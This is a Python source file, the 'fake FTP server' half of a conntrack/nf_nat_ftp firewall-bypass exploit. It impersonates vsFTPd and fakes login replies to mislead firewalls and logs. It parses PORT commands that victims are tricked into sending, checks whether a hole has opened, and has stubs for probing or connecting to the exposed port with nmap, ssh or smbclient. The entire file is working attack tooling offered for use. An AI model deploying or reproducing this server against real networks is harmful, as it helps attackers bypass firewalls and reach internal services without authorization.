#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Fake ftp server code for conntrack exploit
#
# This software is in the public domain, furnished "as is", without technical
# support, and with no warranty, express or implied, as to its usefulness for
# any purpose.
#
# Author: Roman Tsisyk
#
# Please read README file first!
# This server gets PORT request from client, checks if ip address matched
# a real cleint adddress and tries to connect. It emulates ftp sometimes, but
# its not realy necessary for our needs, just for a smart firewalls and logs
#

import sys, logging
from SocketServer import ThreadingTCPServer, ThreadingMixIn, BaseRequestHandler

#
# Main server class
#
class BackConnectServer(ThreadingMixIn, ThreadingTCPServer):
	# logger
	log = None;

	#
	# Main handler
	#
	class BackConnectHandler(BaseRequestHandler):
		def __init__(self, request, client_address, server):
			self.log = server.log;
			BaseRequestHandler.__init__(self, request, client_address, server);

		def setup(self):
			self.log.info('%s:%s connected', *self.client_address);
			self.request.send('220 vsFTPd ready.\n');

		def check(self, ip, port):
			self.log.info('%s: probing %s:%s', self.client_address, ip, port);

			#
			# connect to this port using external program and do smth
			#
			# os.system('nmap %s -A -p %s', ip, port);
			# return True; if connection established

			return False;

		def handle(self):
			data = True;
			while data:
				data = self.request.recv(1024);
				cmd = data[0:4];

				self.log.debug('%s: %s', self.client_address, data.strip());
				# we really not have to handle all ftp protocol and check states like fsm
				# let client think that auth realy needed and there is real ftp
				if cmd == 'PORT':
					port_data = data[4:].strip().split(',');
					try:
						# extract port number
						port = int(port_data[4]) << 8 | int(port_data[5]);
					except:
						self.log.error('%s: Invalid reply received', self.client_address);

					# check if there is not NAT or
					#   nf_nat_ftp converted internal fake ip to external
					if ('.'.join(port_data[0:4]) == self.client_address[0]):
						self.log.info('%s: PORT success', self.client_address);

						# run extern program (e.g. ssh or smbclient) and do something
						if self.check(self.client_address[0], port):
							# matrix has you :)
							self.log('%s: port %s works',
									  self.client_address, port);
						else:
							self.log.debug('%s: connection to %s:%s failed',
											self.client_address, self.client_address[0], port);

						# stop client script
						self.request.send('200 PORT command successful.\n');
						return;
					else:
						self.log.debug('%s: PORT failed', self.client_address);

					self.request.send('500 Illegal PORT command.\n');
				elif cmd == 'USER':
					self.request.send('331 Please specify the password.\n');
				elif cmd == 'PASS':
					self.request.send('530 Login incorrect.\n');
				elif cmd == 'QUIT':
					return
				else:
					self.request.send('530 Please login with USER and PASS.\n');

		def finish(self):
			self.log.info('%s:%s disconnected', *self.client_address);
			self.request.send('221 Goodbye.');

	def __init__(self):
		self.log = logging.getLogger();
		self.log.setLevel(logging.DEBUG);
		log_hdl = logging.StreamHandler();
		log_hdl.setFormatter(logging.Formatter( '%(asctime)s %(levelname)s %(message)s' ))
		self.log.addHandler(log_hdl);
		self.allow_reuse_address = True;
		ThreadingTCPServer.__init__(self, ('', 21), self.BackConnectHandler);

# run server
server = BackConnectServer();
server.serve_forever();
